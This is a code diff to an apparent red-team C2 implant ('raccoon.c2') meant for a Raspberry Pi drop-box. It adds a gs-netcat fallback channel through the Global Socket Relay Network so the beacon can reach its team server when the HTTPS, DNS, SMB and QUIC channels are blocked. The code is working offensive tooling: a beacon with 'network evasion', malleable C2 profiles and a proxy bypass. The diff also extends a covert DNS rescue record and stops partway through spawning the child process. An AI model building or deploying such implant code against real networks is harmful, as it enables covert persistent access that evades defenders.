@@ -33,7 +33,7 @@ import urllib.error
 import zipfile
 import urllib.request
 from pathlib import Path
-from typing import Callable, Iterable, Optional, Tuple
+from typing import Callable, Dict, Iterable, List, Optional, Tuple
 
 logger = logging.getLogger("raccoon.c2")
 
@@ -1667,13 +1667,20 @@ def _dns_query(name: str, qtype: str, server: str, timeout: float = 10,
     return results
 
 
-# The four channels a beacon can use, and the one place the config file is
+# The five channels a beacon can use, and the one place the config file is
 # mapped onto them. `main.py` and `beacon_standalone.py` each used to build
 # this dictionary by hand, and each listed https and dns only -- so `smb`
 # and `quic` in a config file never reached the beacon, and the only way
 # to switch either on was to construct a Beacon in Python. Two copies of
 # one mapping, both missing the same half, is how that survived.
-_FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic")
+#
+# `gsocket` goes last, and the order is the order the legs are tried. It
+# is the only one whose precondition is not "the team server is reachable
+# at an address this implant can name": it dials the Global Socket Relay
+# Network through a `gs-netcat` child and is paired with the team server
+# by a shared secret. That makes it the leg to try when the four above it
+# have failed, and nothing to spend a child process on before then.
+_FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic", "gsocket")
 
 # ── The rescue record, copied from software/c2/dns_rescue.py ──
 #
@@ -1682,13 +1689,15 @@ _FALLBACK_TRANSPORTS = ("https", "dns", "smb", "quic")
 # resolve there, and `relay.py`'s comment on `_PAYLOAD_FIELDS` records the
 # same constraint from the listener's side. The copy is the price; a test
 # in test_dns_rescue compares the two and fails when they drift.
-_RESCUE_VERSION = 1
+_RESCUE_VERSION = 2
 _RESCUE_MARKER = "r"
-_RESCUE_TRANSPORTS = ("https", "dns", "smb", "quic")
+_RESCUE_TRANSPORTS = ("https", "dns", "smb", "quic", "gsocket")
 # The legs that carry traffic *out*. DNS is not one of them, which is
 # the whole reason the rescue exists -- and the reason receiving over
-# DNS must not be read as "the way out is open again".
-_RESCUE_UPSTREAM = ("https", "smb", "quic")
+# DNS must not be read as "the way out is open again". `gsocket` is one:
+# the forward it opens carries a request and its answer, so a cycle it
+# delivered is a cycle whose results can be reported too.
+_RESCUE_UPSTREAM = ("https", "smb", "quic", "gsocket")
 _RESCUE_CLASSES = {
     "not_attempted": 0,
     "answered": 1,
@@ -1700,6 +1709,11 @@ _RESCUE_CLASSES = {
     "auth_required": 7,
     "bad_payload": 8,
     "resolve_failed": 9,
+    # The two a leg that needs a helper process has and no socket does:
+    # the carrier binary was not on the host, and the carrier was there
+    # and did not come up.
+    "binary_missing": 10,
+    "carrier_failed": 11,
 }
 _RESCUE_FLAG_PROXY_FOUND = 0x01
 _RESCUE_FLAG_DOT1X_SEEN = 0x02
@@ -1708,7 +1722,12 @@ _RESCUE_FLAG_DNS_ANSWERED = 0x08
 # version + (class, code-as-two-bytes) per transport + flags. Two bytes for
 # the code because 407 -- a proxy demanding authentication -- does not fit
 # in one, and nor does any three-digit status above 255.
-_RESCUE_STRUCT = struct.Struct("!BHBHBHBHBHB")
+#
+# Five transports, 19 bytes. There is no v1 arm here and there should not
+# be: a beacon only ever writes the version it was built with. The
+# server-side copy is the one that still has to read the 16-byte records
+# implants deployed before the carrier leg keep sending.
+_RESCUE_STRUCT = struct.Struct("!BHBHBHBHBHBHB")
 # The key the record travels under; see dns_rescue.WRAPPER_KEY for the
 # arithmetic that chose it over an "action" value.
 _RESCUE_WRAPPER_KEY = "r"
@@ -4934,6 +4953,54 @@ def persistence_name(entropy: bytes) -> str:
                        entropy[2:4].hex())
 
 
+# ── The gsocket leg's own copies ──
+#
+# Copied from `software/c2/gsocket/config.py`'s `LEG_DEFAULTS` and from
+# `carrier.py`, not imported: this file is served to a target as source
+# text and may import only the standard library. `test_gsocket_leg.py`
+# compares both copies against their originals, the way
+# `test_dns_rescue.py` compares the rescue format's.
+#
+# `scheme` is "http" and not "https" because `server.py`'s `--ssl` is off
+# by default and every shipped `relay_url` is `http://127.0.0.1:8443`.
+# Confidentiality on that hop rests on the SRP/AES-256 session gsocket
+# negotiates end to end and on the AES-256-GCM envelope inside it.
+#
+# `max_restarts: 0` means unlimited, the meaning `c2.sliver.max_restarts`
+# already has.
+_GSOCKET_DEFAULTS = {
+    "scheme": "http",
+    "local_port": 16443,
+    "restart_delay_seconds": 30,
+    "max_restarts": 0,
+    "ready_timeout_seconds": 20,
+}
+
+# How much of the binary to hash at a time, from `carrier._HASH_CHUNK`.
+# An implant is a Raspberry Pi Zero, so the digest is streamed rather
+# than slurped.
+_GSOCKET_HASH_CHUNK = 1024 * 1024
+
+# How long a single readiness probe may take, and how long to wait between
+# two of them. Both are about loopback: the forward is on this host or it
+# is nowhere, so a connect that has not answered in a second is not going
+# to. The ceiling on the whole wait is `ready_timeout_seconds`.
+_GSOCKET_PROBE_TIMEOUT = 1.0
+_GSOCKET_READY_POLL = 0.25
+
+# What must not reach the child, from `carrier._child_environment`. A deny
+# rule and not an allow list, for the reason that module gives: a variable
+# withheld from `gs-netcat` produces a carrier that joins the relay
+# network and never finds its peer, which is the one failure here nobody
+# can diagnose. `RACCOON_` is a prefix rather than a list so that it still
+# covers the next credential variable somebody adds; `GSOCKET_ARGS` is
+# named because gsocket's own tools append it to the argv this leg built,
+# and the shape it could add includes the `-s <secret>` that would put
+# this implant's credential in a world-readable `ps` line.
+_GSOCKET_ENVIRONMENT_PREFIX_DENIED = "RACCOON_"
+_GSOCKET_ENVIRONMENT_DENIED = frozenset({"GSOCKET_ARGS"})
+
+
 class Beacon:
     """C2 beacon with AES-GCM encryption and network evasion."""
 
@@ -4946,6 +5013,7 @@ class Beacon:
         dns_cfg = c2.get("dns", {})
         smb_cfg = c2.get("smb", {})
         quic_cfg = c2.get("quic", {})
+        gsocket_cfg = c2.get("gsocket") or {}
 
         self.https_enabled = https_cfg.get("enabled", False)
         self.callback_url = https_cfg.get("callback_url", "")
@@ -4961,6 +5029,94 @@ class Beacon:
 
         self.quic_enabled = quic_cfg.get("enabled", False)
         self.quic_server = quic_cfg.get("server", "")
+
+        # ── the gsocket leg ──
+        #
+        # Read the way `smb_cfg` and `quic_cfg` are read, with one
+        # difference: this leg runs a child process, so two of its
+        # settings have to be usable before anything is spawned.
+        #
+        # There is no validator here and there must not be one.
+        # `gsocket/config.validate_leg` is strict, names every offending
+        # value, and lives in a module this file may not import; the team
+        # server's startup path already calls it. An inline third copy
+        # would be the thing that drifts. So a block that is absent,
+        # incomplete or unusable reads as **disabled, with the reason
+        # logged once** -- which is how the other four transports already
+        # behave, except that they do it silently and a leg with a child
+        # process can afford to say why.
+        #
+        # `binary_path` is the deliberate exception: an absent or empty
+        # one is left to `_gsocket_binary_problem`, whose copied reason
+        # for exactly that case ("binary_path is empty, so there is
+        # nothing for the carrier to exec") is better than anything said
+        # here, and whose answer reaches the operator as a
+        # `binary_missing` rescue record rather than only as a log line
+        # on a host nobody can read.
+        # `enabled` is read **by value**, never as `bool(...)`: a
+        # `bool("false")` is `True`, and YAML does not unquote a quoted
+        # scalar, so `enabled: "false"` would have switched this leg on
+        # out of a file that says the opposite. "Everything ships
+        # disabled" is a constraint of this project, and this is the one
+        # leg whose enabled state is an outbound connection to a third
+        # party's relay network -- the one direction in which guessing
+        # costs something nobody can take back. `config.validate_leg`
+        # refuses such a value by name on the team server; here, where a
+        # raised exception would cost the whole beacon, anything that is
+        # not the boolean `true` is off and says why once.
+        raw_enabled = gsocket_cfg.get("enabled", False)
+        self.gsocket_enabled = raw_enabled is True
+        if "enabled" in gsocket_cfg and not isinstance(raw_enabled, bool):
+            logger.warning(
+                "The gsocket leg is off: c2.fallback.gsocket.enabled is %r, "
+                "and only the boolean true enables this leg -- an unquoted "
+                "true or false is what this setting takes", raw_enabled)
+        self.gsocket_secret_file = str(gsocket_cfg.get("secret_file") or "")
+        self.gsocket_binary_path = str(gsocket_cfg.get("binary_path") or "")
+        # Lower-cased here for the same reason `config._checked_sha256`
+        # does it: what it is compared against is a `hexdigest()`, and a
+        # digest pasted out of a Windows tool would match nothing --
+        # which reads as a replaced binary, the one finding in this
+        # feature nobody should get wrong.
+        self.gsocket_sha256 = str(gsocket_cfg.get("sha256") or "").strip().lower()
+        self.gsocket_scheme = _GSOCKET_DEFAULTS["scheme"]
+        self.gsocket_local_port = _GSOCKET_DEFAULTS["local_port"]
+        self.gsocket_restart_delay_seconds = \
+            _GSOCKET_DEFAULTS["restart_delay_seconds"]
+        self.gsocket_max_restarts = _GSOCKET_DEFAULTS["max_restarts"]
+        self.gsocket_ready_timeout_seconds = \
+            _GSOCKET_DEFAULTS["ready_timeout_seconds"]
+        unusable = self._gsocket_settings(gsocket_cfg)
+        if self.gsocket_enabled and unusable:
+            # Once, at construction, and then the leg is off. The leg is
+            # not asked again, because the answer cannot change: nothing
+            # rereads the config block.
+            logger.warning("The gsocket leg is off: %s", unusable)
+            self.gsocket_enabled = False
+
+        # The carrier's child, and what this beacon knows about it. All of
+        # it is set up here rather than lazily, so that `_gsocket_stop` on
+        # a beacon that never started one has something to read.
+        self._gsocket_proc: Optional[subprocess.Popen] = None
+        # By the monotonic clock: the readiness window and the restart
+        # delay are both durations, and a wall-clock step -- NTP catching
+        # up on a drop-box that has been off for a month -- would
+        # otherwise make one of them negative.
+        self._gsocket_started_at: Optional[float] = None
+        # Latched once the forward has accepted a connection. It is what
+        # makes the second outage free: a carrier that has been up since
+        # the first one is not probed again, because the request about to
+        # go through it is the probe.
+        self._gsocket_ready_seen = False
+        # Spawns, not restarts: the first start is one of these, and
+        # `max_restarts` is compared against the ones after it.
+        self._gsocket_starts = 0
+        # Why this leg has stopped trying, and which rescue class says so.
+        # Latched, so the reason is logged once and the expensive half of
+        # the binary check -- a SHA-256 of a multi-megabyte file -- is
+        # paid once rather than on every cycle.
+        self._gsocket_problem = ""
+        self._gsocket_problem_class = 0
 
         self._key = decode_key(c2.get("encryption_key"))
 
@@ -5088,8 +5244,18 @@ class Beacon:
 
     # ── Evasion helpers ──
 
-    def _evasive_url(self, endpoint: str) -> str:
-        base = self.callback_url.rsplit("/", 1)[0]
+    def _evasive_url(self, endpoint: str, base: Optional[str] = None) -> str:
+        """One request's URL, under the active C2 profile.
+
+        `base` lets a caller aim the same profile at a different socket.
+        The default is the parent of the callback URL, which is what this
+        did unconditionally before the gsocket leg existed, so every
+        existing caller is unchanged. That leg passes the near end of its
+        own forward -- and the profile applying inside the pipe too is
+        correct, because the far end of it is the same beacon socket.
+        """
+        if base is None:
+            base = self.callback_url.rsplit("/", 1)[0]
         profile_block = self._c2_profile.get(
             "http_post" if endpoint == "result" else "http_get", {})
         uris = profile_block.get("uris", [])
@@ -5395,13 +5561,37 @@ class Beacon:
 
     # ── HTTPS transport ──
 
-    def _https_post(self, endpoint: str, data: dict) -> Optional[dict]:
-        """POST encrypted payload via proxy-aware session; returns decrypted response or None."""
+    def _https_post(self, endpoint: str, data: dict,
+                    base: Optional[str] = None,
+                    transport: str = "https") -> Optional[dict]:
+        """POST encrypted payload via proxy-aware session; returns decrypted response or None.
+
+        `base` aims the request somewhere other than the callback URL, and
+        `transport` says which leg a failure belongs to. Both exist for
+        the gsocket leg, which posts these same payloads through a local
+        forward: one HTTP client, and one place where the C2 profile, the
+        envelope and the decoy fields are applied, rather than a second
+        client that would drift from this one. Without `transport` the
+        `_record_leg` calls below would file a carrier's failure against
+        HTTPS, and an operator would chase a callback URL that is working
+        perfectly.
+        """
         session = self._proxy_session or _HttpSession()
+        if self._is_loopback_base(base):
+            # A forward on this host is never reached through a proxy. The
+            # leg that passes a loopback base exists for the network where
+            # every other leg failed, and a corporate proxy is the
+            # commonest reason for that -- so the one deployment it is for
+            # is also the one where a proxied session would hand this
+            # request to a proxy that cannot reach `127.0.0.1`, and the
+            # leg would never work. `trust_env` off for the same reason:
+            # `http_proxy` in the implant's environment would do it too.
+            session = _HttpSession()
+            session.trust_env = False
         hdrs = self._post_headers() if endpoint == "result" else self._evasive_headers()
         try:
             resp = session.post(
-                self._evasive_url(endpoint),
+                self._evasive_url(endpoint, base),
                 json_data=self._wrap_payload(data),
                 headers=hdrs,
                 timeout=30,
@@ -5412,10 +5602,10 @@ class Beacon:
                 return result if result else {}
             if resp.status_code == 407:
                 logger.warning("Proxy auth required (407) — set proxy credentials in URL")
-                self._record_leg("https", _RESCUE_CLASSES["auth_required"],
+                self._record_leg(transport, _RESCUE_CLASSES["auth_required"],
                                  407)
             elif resp.status_code != 200:
-                self._record_leg("https", _RESCUE_CLASSES["http_status"],
+                self._record_leg(transport, _RESCUE_CLASSES["http_status"],
                                  resp.status_code)
         except _ProxyError as e:
             logger.debug("Proxy error on %s: %s — retrying direct", endpoint, e)
@@ -5426,12 +5616,12 @@ class Beacon:
             # refused the connection or timed out. Only a 407 means it
             # wants credentials, and that is recorded above where the
             # status code is actually known.
-            self._record_leg("https", _rescue_class_of(e))
+            self._record_leg(transport, _rescue_class_of(e))
             try:
                 direct = _HttpSession()
                 direct.trust_env = False
                 resp = direct.post(
-                    self._evasive_url(endpoint),
+                    self._evasive_url(endpoint, base),
                     json_data=self._wrap_payload(data),
                     headers=hdrs,
                     timeout=30,
@@ -5444,18 +5634,126 @@ class Beacon:
                 pass
         except Exception as e:
             logger.debug("HTTPS %s failed: %s", endpoint, e)
-            self._record_leg("https", _rescue_class_of(e))
+            self._record_leg(transport, _rescue_class_of(e))
         return None
+
+    @staticmethod
+    def _is_loopback_base(base: Optional[str]) -> bool:
+        """Whether `base` names a socket on this host.
+
+        Read off the URL rather than resolved: this is on the request path
+        of a leg that exists for hostile networks, and a DNS lookup to
+        decide whether to use a proxy is a lookup answered by whoever
+        controls the resolver.
+        """
+        if not base:
+            return False
+        netloc = base.split("://", 1)[-1].split("/", 1)[0]
+        if "@" in netloc:
+            netloc = netloc.rsplit("@", 1)[1]
+        host = netloc.rsplit(":", 1)[0] if ":" in netloc else netloc
+        host = host.strip("[]").lower()
+        return host.startswith("127.") or host in ("localhost", "::1")
 
     def _register_https(self) -> bool:
         info = self._system_info()
         info["action"] = "register"
-        result = self._https_post("register", info)
-        if result is not None and result.get("success"):
-            self._agent_id = result.get("agent_id", self._implant_id)
-            self._registered = True
-            logger.info("Registered as %s", self._agent_id)
-            return True
+        return self._adopt_registration(self._https_post("register", info))
+
+    def _adopt_registration(self, answer: Optional[dict]) -> bool:
+        """Take the identity the server assigned, and say whether we did.
+
+        An answer counts as a registration only when it carries
+        `success`, which is what `_handle_register` replies and what no
+        other action replies: a check-in answer is tasking or `{}`, so
+        this cannot read an empty queue as an identity.
+
+        It exists because `_agent_id` used to be adopted in
+        `_register_https` and nowhere else, while the SMB, QUIC and
+        gsocket rungs of `_beacon_loop` promoted `_registered` on their
+        own. An implant that registered over any leg but HTTPS therefore
+        filed every result afterwards under its *implant* id -- and
+        `_handle_result` keys the agent's `history` by the name the
+        server assigned, so that work never appeared against the agent at
+        all. Registering without adopting the id is half a registration,
+        and the fix belongs in one place rather than in four rungs that
+        would drift.
+        """
+        if not (answer and answer.get("success")):
+            return False
+        self._agent_id = answer.get("agent_id", self._implant_id)
+        self._registered = True
+        logger.info("Registered as %s", self._agent_id)
+        return True
+
+    def _registration_legs(self) -> List[str]:
+        """The upstream legs a registration can be attempted over now.
+
+        Walked in `_RESCUE_UPSTREAM`'s order, which is the chain's order
+        with `dns` removed -- and removed for the reason that constant
+        gives: DNS carries nothing *out*, so a registration sent over it
+        could never be followed by a result. Taking the order from there
+        rather than restating it is what keeps the two from drifting when
+        a sixth leg arrives.
+
+        The gsocket leg is a candidate only when its carrier is already
+        up. That is not an optimisation: the latch is the operator's
+        decision, and a registration that started `gs-netcat` would make
+        every healthy implant hold a connection to the Global Socket
+        Relay Network for the life of the process. `_gsocket_ready`
+        starts nothing -- with no child it answers False at once -- so a
+        gsocket-only implant finds nothing to register over at beacon
+        start, the preamble skips, and the leg registers from inside the
+        loop on the cycle after the latch brought the carrier up, through
+        the `action=register` arm `_beacon_gsocket` already carries.
+        """
+        enabled = {
+            "https": self.https_enabled,
+            "smb": self.smb_enabled,
+            "quic": self.quic_enabled,
+            "gsocket": self.gsocket_enabled and self._gsocket_ready(),
+        }
+        # `.get` and not `[]`: this runs in the beacon's main loop, and a
+        # sixth name in `_RESCUE_UPSTREAM` that nobody added here would
+        # otherwise raise a KeyError on an implant rather than cost that
+        # one leg a registration.
+        return [leg for leg in _RESCUE_UPSTREAM if enabled.get(leg)]
+
+    def _register_upstream(self) -> bool:
+        """Register over the first enabled upstream leg that answers.
+
+        The preamble was gated on `https_enabled`, which was true enough
+        while HTTPS was the only leg carrying an `action=register` of its
+        own. The configuration this exists for is the one where it is
+        off: an implant whose four original legs are all blocked reaches
+        the team server over gsocket alone, and gated on HTTPS it would
+        never register, never appear in the fleet, and look healthy from
+        every other angle.
+
+        Nothing is dropped by trying a check-in method here. Each of the
+        other three sends `action=register` while `_registered` is False,
+        which it is at both call sites -- the preamble has never
+        registered, and the re-registration arm clears it first -- and
+        the reply to a registration is an identity and never tasking.
+
+        The four names below are the only ones `_registration_legs` can
+        return, which is why the last arm is an `else`: a name it did not
+        recognise would otherwise leave `delivered` unbound and raise in
+        the beacon's main loop.
+        """
+        for leg in self._registration_legs():
+            if leg == "https":
+                # The one leg with a registration call of its own: its
+                # check-in does not carry the register action itself.
+                delivered = self._register_https()
+            elif leg == "smb":
+                delivered = self._adopt_registration(self._beacon_smb())
+            elif leg == "quic":
+                delivered = self._adopt_registration(self._beacon_quic())
+            else:
+                delivered = self._adopt_registration(self._beacon_gsocket())
+            if delivered:
+                return True
         return False
 
     def _start_cycle(self):
@@ -6024,6 +6322,558 @@ class Beacon:
         if data:
             result["data"] = data
         self._quic_send(result)
+
+    # ── gsocket (a gs-netcat forward) transport ──
+    #
+    # The fifth leg, and the only one whose precondition is not "the team
+    # server is reachable at an address this implant can name". A
+    # `gs-netcat` child dials *out* to the Global Socket Relay Network,
+    # the team server's carrier does the same, and the two are paired by a
+    # shared secret. So the leg survives the case the other four share:
+    # the HTTPS URL, the DNS zone, the SMB host and the QUIC host all
+    # blocked or burned at once.
+    #
+    # Four properties are deliberate, and three of them are copies.
+    #
+    # **The secret never reaches a command line.** `gs-netcat` accepts
+    # `-s <secret>` and its own documentation warns against it, because
+    # `ps` is world-readable -- and on an implant it is readable by
+    # whoever found the device. `-k <path>` only, here and nowhere else.
+    #
+    # **The leg is lazy with a warm latch.** The carrier does not run at
+    # beacon start: a healthy implant holds no GSRN connection at all,
+    # because a connection to a third-party relay network is a thing a
+    # defender can see and nothing an implant should be holding while
+    # HTTPS works. It starts the first time a cycle ends with no upstream
+    # leg having delivered -- the same condition the rescue latch uses --
+    # and then stays up for the life of the process, so the second outage
+    # costs no readiness wait.
+    #
+    # **The binary is verified before it is exec'd**, by a copy of
+    # `gsocket/carrier.binary_problem`. The copy is forced: this file is
+    # served to a target as source text and may import nothing from this
+    # repository. `test_gsocket_leg` compares the two word for word, as
+    # `test_dns_rescue` compares the rescue format's copy, because two
+    # checks that disagree about wording are two checks that will
+    # disagree about behaviour next.
+    #
+    # **The HTTP path is the one the HTTPS leg uses**, aimed at the
+    # forward instead of at the callback URL. There is no second client:
+    # the far end of the forward is the same beacon socket, so the
+    # malleable C2 profile applies inside the pipe unchanged, and a
+    # failure inside the pipe is recorded against `gsocket` because
+    # `_https_post` is told which leg to blame.
+    #
+    # Which address the child's own `-p` forward *binds* is not known;
+    # the question, the one-line check that would settle it and what
+    # depends on the answer are recorded above `GsocketCarrier.argv` in
+    # `software/c2/gsocket/carrier.py`. Nothing here depends on it: this
+    # leg only ever **connects** to `127.0.0.1`.
+
+    def _gsocket_settings(self, block: dict) -> str:
+        """Read the leg's settings; return why one is unusable, or "".
+
+        A reason and not an exception, because `Beacon.__init__` is on the
+        path of every implant that has a config file at all: a bad
+        `local_port` in one leg must cost that leg and not the beacon.
+
+        The minimums are the ones `gsocket/config.validate_leg` uses, for
+        the reasons it gives -- a `restart_delay_seconds` of zero restarts
+        `gs-netcat` as fast as it can fail, which is a busy loop and a
+        flood of joins on the relay network, both loud in exactly the
+        place an implant has to be quiet; a `ready_timeout_seconds` of
+        zero declares every carrier not-ready the instant it started, so
+        the leg would never be used and nothing would say why. This is not
+        a second validator: it reads five values for use and refuses one
+        it cannot use. Strict validation stays on the team server's
+        startup path, which already has it.
+        """
+        if not self.gsocket_secret_file.strip():
+            return ("c2.fallback.gsocket.secret_file is empty, and the "
+                    "secret is this leg's whole address on the relay "
+                    "network -- `gs-netcat -k <path>` has nothing to read. "
+                    "Nothing in this repository writes that file: create it "
+                    "by hand on this host, mode 0600, holding the secret "
+                    "and nothing else. The GSRN section of "
+                    "docs/LISTENERS.md gives the command")
+
+        scheme = block.get("scheme", _GSOCKET_DEFAULTS["scheme"])
+        # Normalised rather than compared as written: a URL scheme is
+        # case-insensitive, and what it becomes is a URL, which wants one
+        # spelling.
+        normalised = scheme.strip().lower() if isinstance(scheme, str) else None
+        if normalised not in ("http", "https"):
+            return ("c2.fallback.gsocket.scheme is %r; it must be http or "
+                    "https" % (scheme,))
+        self.gsocket_scheme = normalised
+
+        port = block.get("local_port", _GSOCKET_DEFAULTS["local_port"])
+        # bool is an int in Python, and `local_port: true` is a plausible
+        # YAML typo that would otherwise pass as port 1.
+        if isinstance(port, bool) or not isinstance(port, int) \
+                or not 1 <= port <= 65535:
+            return ("c2.fallback.gsocket.local_port is %r; it must be an "
+                    "integer between 1 and 65535, because it is the port "
+                    "the forward comes out at and the port this leg then "
+                    "addresses on 127.0.0.1" % (port,))
+        self.gsocket_local_port = port
+
+        for key, minimum, attribute in (
+                ("restart_delay_seconds", 1, "gsocket_restart_delay_seconds"),
+                ("max_restarts", 0, "gsocket_max_restarts"),
+                ("ready_timeout_seconds", 1, "gsocket_ready_timeout_seconds")):
+            value = block.get(key, _GSOCKET_DEFAULTS[key])
+            if isinstance(value, bool) or not isinstance(value, int) \
+                    or value < minimum:
+                return ("c2.fallback.gsocket.%s is %r; it must be an integer "
+                        "of at least %d" % (key, value, minimum))
+            setattr(self, attribute, value)
+        return ""
+
+    def _gsocket_base(self) -> str:
+        """Where this leg posts: the near end of its own forward.
+
+        `127.0.0.1` because that is the address this process *connects*
+        to, which is settled whatever the child turns out to bind.
+        """
+        return "%s://127.0.0.1:%d/api/v1" % (self.gsocket_scheme,
+                                             self.gsocket_local_port)
+
+    def _gsocket_argv(self) -> List[str]:
+        """`gs-netcat -k <secret_file> -w -p <local_port>`.
+
+        A copy of `gsocket/carrier.implant_argv`, which exists in that
+        file next to the server's shape so that a reviewer has something
+        to compare this against; `test_gsocket_leg` compares them.
+
+        `-w` makes this end a client that **waits** for its peer rather
+        than one that fails when the peer is not there yet, and the normal
+        case is exactly that: an implant powers up in a cupboard long
+        before anybody starts the team server.
+        """
+        return [os.fspath(self.gsocket_binary_path),
+                "-k", os.fspath(self.gsocket_secret_file),
+                "-w",
+                "-p", str(self.gsocket_local_port)]
+
+    def _gsocket_environment(self) -> Dict[str, str]:
+        """This process's environment, less anything of ours.
+
+        A copy of `gsocket/carrier._child_environment`, and a deny rule
+        rather than an allow list for the reason given there: `gs-netcat`
+        reads `HOME`, the proxy variables and the relay overrides, and a
+        variable withheld from it produces a carrier that joins the relay
+        network and never finds its peer -- the one failure here that
+        looks identical to a hostile network, a wrong secret and a peer
+        that is simply off.
+
+        What is dropped is every `RACCOON_*` variable, which is where this
+        project keeps its own secrets, and `GSOCKET_ARGS`, which gsocket's
+        tools append to the argv built above.
+        """
+        return {
+            name: value
+            for name, value in os.environ.items()
+            if not name.startswith(_GSOCKET_ENVIRONMENT_PREFIX_DENIED)
+            and name not in _GSOCKET_ENVIRONMENT_DENIED
+        }
+
+    def _gsocket_binary_problem(self) -> Optional[str]:
+        """Why this leg's `gs-netcat` cannot be exec'd, or `None`.
+
+        A deliberate copy of `gsocket/carrier.binary_problem`, reason
+        strings included, because this file may import nothing from this
+        repository. Existence, the executable bit and the SHA-256, in that
+        order, each returning a reason rather than raising -- the caller
+        decides whether a reason is fatal, and here it is: a leg with no
+        binary is a leg that is off, recorded as `binary_missing`.
+
+        One clause of the digest-mismatch reason reads oddly from an
+        implant's side: it speaks of "the secret that fronts the beacon
+        socket", which is the team server's framing. It is copied
+        unchanged on purpose. The wording is a known, parked review
+        finding, and a divergence improvised here would break the test
+        that compares the two checks and hide the parked item with it.
+
+        `sha256` empty skips the digest check, exactly as
+        `c2.sliver.sha256` does: a deployment that never measured its
+        binary still has to be able to run one.
+        """
+        path = os.fspath(self.gsocket_binary_path)
+        if not path.strip():
+            # An empty `binary_path`, which is what a configuration
+            # written before anybody installed gs-netcat holds. Said
+            # plainly, because `os.stat("")` would otherwise produce a
+            # reason whose subject is an empty string -- a sentence
+            # beginning ": no such file", which reads as a bug in this
+            # check rather than as a missing setting.
+            return ("no gs-netcat binary is configured: binary_path is empty, "
+                    "so there is nothing for the carrier to exec")
+        try:
+            status = os.stat(path)
+        except FileNotFoundError:
+            return ("%s: no such file, so there is no gs-netcat to exec. "
+                    "Install the binary at that path, or correct the "
+                    "configured binary_path" % path)
+        except OSError as exc:
+            return ("%s: cannot be examined: %s. Until that is answered the "
+                    "carrier cannot know what it would be exec'ing"
+                    % (path, exc))
+
+        if not stat.S_ISREG(status.st_mode):
+            # A directory carries the executable bit, so an exec-bit check
+            # on its own passes one and the failure arrives from the spawn
+            # as a bare permission error against a path that looks right.
+            return ("%s: not a regular file, so it is not a binary this "
+                    "carrier can exec" % path)
+
+        if not os.access(path, os.X_OK):
+            return ("%s: mode is 0o%03o, and the user running this process "
+                    "may not execute it. The carrier execs gs-netcat "
+                    "directly, so either chmod +x that file or point "
+                    "binary_path at a copy this user may run"
+                    % (path, stat.S_IMODE(status.st_mode)))
+
+        expected = (self.gsocket_sha256 or "").strip().lower()
+        if not expected:
+            # Empty is "do not verify", the meaning c2.sliver.sha256 has.
+            return None
+
+        digest = hashlib.sha256()
+        try:
+            with open(path, "rb") as handle:
+                while True:
+                    chunk = handle.read(_GSOCKET_HASH_CHUNK)
+                    if not chunk:
+                        break
+                    digest.update(chunk)
+        except OSError as exc:
+            return ("%s: cannot be read to check its sha256: %s. An "
+                    "unverifiable binary is treated as a failed check and "
+                    "not as a passed one" % (path, exc))
+
+        actual = digest.hexdigest()
+        if actual != expected:
+            return ("%s: its sha256 is %s, but the configuration expects %s. "
+                    "Either the digest in the configuration is stale, or "
+                    "this is not the binary that was measured -- and the "
+                    "second one is a gs-netcat somebody else put there, "
+                    "which would be handed the secret that fronts the beacon "
+                    "socket" % (path, actual, expected))
+        return None
+
+    def _gsocket_start(self) -> bool:
+        """Bring the carrier up if it is not, and say whether it is now.
+
+        Called from one place: where `_beacon_loop` concludes that no
+        upstream leg delivered. That is the latch, and it is also the
+        whole restart loop -- a cycle whose carrier died is a cycle where
+        nothing delivered, so the same condition brings it back. There is
+        deliberately no timer and no watcher thread: a restart in two
+        places is a child that reappears after something stopped it, which
+        is what `carrier.py` and `supervisor.py` each say about
+        themselves.
+
+        Never raises. It runs on the beacon thread between a failed cycle
+        and the rescue, and an exception here would cost the rescue that
+        is about to carry the reason.
+        """
+        if not self.gsocket_enabled:
+            return False
+        if self._gsocket_problem:
+            # Latched: the binary is not there, or the restart ceiling is
+            # reached. Recorded on every cycle all the same -- the leg was
+            # reached and produced nothing, and a record left empty packs
+            # as `not_attempted`, which told an operator "QUIC: not tried"
+            # about a leg that had timed out until that was fixed.
+            self._record_leg("gsocket", self._gsocket_problem_class)
+            return False
+
+        proc = self._gsocket_proc
+        if proc is not None:
+            if proc.poll() is None:
+                return True
+            # It died on its own. `poll` has just reaped it; the exit code
+            # is the only thing distinguishing "the relay refused us" from
+            # "somebody killed it", and the child's output goes to
+            # DEVNULL, as the tunnel child's does, so there is nothing
+            # else to say.
+            logger.debug("gsocket: the carrier (pid %d) is gone, exit %s",
+                         proc.pid, proc.poll())
+            self._gsocket_proc = None
+            self._gsocket_ready_seen = False
+            self._record_leg("gsocket", _RESCUE_CLASSES["carrier_failed"])
+            if self.gsocket_max_restarts and \
+                    self._gsocket_starts > self.gsocket_max_restarts:
+                self._gsocket_problem = (
+                    "the carrier has been started %d times and "
+                    "max_restarts is %d, so this leg will not start another"
+                    % (self._gsocket_starts, self.gsocket_max_restarts))
+                self._gsocket_problem_class = \
+                    _RESCUE_CLASSES["carrier_failed"]
+                logger.warning("The gsocket leg is off: %s",
+                               self._gsocket_problem)
+                return False
+            waited = time.monotonic() - (self._gsocket_started_at or 0.0)
+            if waited < self.gsocket_restart_delay_seconds:
+                # Measured from the previous start and not from the death,
+                # so a carrier that ran for a week comes back on the next
+                # cycle while one that failed on exec waits. The delay is
+                # what keeps a `gs-netcat` that cannot work from being a
+                # busy loop on the implant and a flood of joins on the
+                # relay network.
+                logger.debug("gsocket: %0.0fs since the last start, delay is "
+                             "%ds; not restarting yet",
+                             waited, self.gsocket_restart_delay_seconds)
+                return False
+
+        problem = self._gsocket_binary_problem()
+        if problem is not None:
+            # Verified before the exec and not after: a hash check
+            # performed after the spawn is a hash check of something
+            # already running. Latched, so the digest of a multi-megabyte
+            # file is taken once rather than on every cycle, and so the
+            # reason is logged once.
+            self._gsocket_problem = problem
+            self._gsocket_problem_class = _RESCUE_CLASSES["binary_missing"]
+            logger.warning("The gsocket leg is off: %s", problem)
+            self._record_leg("gsocket", _RESCUE_CLASSES["binary_missing"])
+            return False
+
+        try:
+            self._gsocket_proc = subprocess.Popen(
+                self._gsocket_argv(),
+                stdin=subprocess.DEVNULL,
+                # `gs-netcat` is a pipe tool: anything it wrote to our
+                # stdout would land in the beacon's own log stream.
+                # Discarded rather than captured, because a captured
+                # stream nobody drains fills its pipe buffer and blocks
+                # the child.
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                env=self._gsocket_environment(),
